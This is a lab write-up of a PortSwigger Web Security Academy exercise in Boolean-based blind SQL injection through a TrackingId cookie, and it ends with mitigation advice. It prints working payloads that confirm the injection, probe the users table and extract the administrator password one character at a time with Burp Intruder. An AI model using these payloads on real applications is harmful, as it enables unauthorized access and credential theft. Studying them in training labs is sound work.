**Blind SQL Injection with Conditional Responses**

Platform: PortSwigger Web Security Academy
Category: SQL Injection
Difficulty: Apprentice
Status: ✅ Solved



**Table of Contents**
Overview

Goal of the Lab

Lab Information

Tools Used

Vulnerability Overview

Exploitation Steps

Result

Skills Demonstrated

Mitigation

References


**Overview**

This write-up demonstrates the exploitation of a Boolean-based Blind SQL Injection vulnerability in a vulnerable web application provided by the PortSwigger Web Security Academy.

The application uses the value of the TrackingId cookie within a SQL query. Although the application does not display SQL errors or query results, it reveals information through a conditional response by displaying a "Welcome back" message whenever the injected SQL query returns one or more rows.

By exploiting these conditional responses, the administrator's password can be enumerated one character at a time and used to authenticate as the administrator.

**Goal of the Lab**
Identify and exploit the blind SQL injection vulnerability in the TrackingId cookie.
Enumerate the password of the administrator user.
Log in as the administrator to solve the lab.
**Lab Information**
**Item**	**Value**
Platform	PortSwigger Web Security Academy
Category	SQL Injection
Vulnerability	Boolean-based Blind SQL Injection
Difficulty	Apprentice
Status	✅ Solved
**Tools Used**
Burp Suite Community Edition
Burp Suite Proxy
Burp Suite Intruder
Firefox
PortSwigger Web Security Academy
**Vulnerability Overview**

Blind SQL Injection occurs when an application is vulnerable to SQL Injection but does not return database errors or query results directly.
Instead, attackers infer information by observing differences in the application's responses.

In this lab:

TRUE condition → "Welcome back" message appears.
FALSE condition → "Welcome back" message disappears.

These conditional responses allow sensitive information to be extracted from the database one character at a time.

**Exploitation Steps**
**Step 1 – Confirm the SQL Injection Vulnerability**
Payload
Cookie: session=...
TrackingId=... ' AND 1=1--
**Explanation**

Injected a condition that always evaluates to TRUE.

Observation
"Welcome back" message appeared.

**Step 2 – Verify Using a FALSE Condition**
Payload
Cookie: session=...
TrackingId=... ' AND 1=0--
**Explanation**

Injected a condition that always evaluates to FALSE.

Observation
"Welcome back" message disappeared.

This confirmed that the application's behavior depends on the truth value of the injected SQL query.

**Step 3 – Confirm the users Table Exists**
Payload
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
**Explanation**

Verified that the users table exists by checking whether a query against it returns a value.

Observation
"Welcome back" message appeared.

The users table exists.

**Step 4 – Confirm the administrator User Exists**
Payload
' AND EXISTS(SELECT 1 FROM users WHERE username='administrator')--
Explanation

Checked whether a record with the username administrator exists.

Observation
"Welcome back" message appeared.

The administrator account exists.

**Step 5 – Determine Password Length**
Payload
' AND (SELECT username
FROM users
WHERE username='administrator'
AND LENGTH(password)>1)='administrator'--
Explanation

Tested multiple password lengths until the application response changed.

Observation
Password length determined to be 20 characters.

**Step 6 – Enumerate the Password Using Burp Suite Intruder**
Payload Template
' AND (SELECT SUBSTRING(password,1,1)
FROM users
WHERE username='administrator')='a'--
Burp Suite Configuration
Attack Type: Cluster Bomb
Payload Position 1: Character position (1–20)
Payload Position 2: Candidate characters (a-z, 0-9)
Explanation

Intruder generated every combination of character position and candidate character. Whenever the application displayed the "Welcome back" message, the tested character was confirmed as correct.

Observation

The administrator's password was successfully reconstructed one character at a time.

Result

✅ Successfully enumerated the administrator's password using Boolean-based Blind SQL Injection.

✅ Logged in as the administrator.

✅ Lab solved successfully.

**Skills Demonstrated**
Blind SQL Injection
Boolean-based SQL Injection
SQL Enumeration
Burp Suite Proxy
Burp Suite Intruder
HTTP Request Manipulation
Cookie Manipulation
Web Application Penetration Testing
Security Documentation
Mitigation

**To prevent this vulnerability:**

Use parameterized queries (prepared statements).
Validate and sanitize user input.
Avoid constructing SQL queries using user-controlled input.
Apply the principle of least privilege.
Implement secure error handling.
Conduct regular security testing.
References
PortSwigger Web Security Academy
Burp Suite Documentation
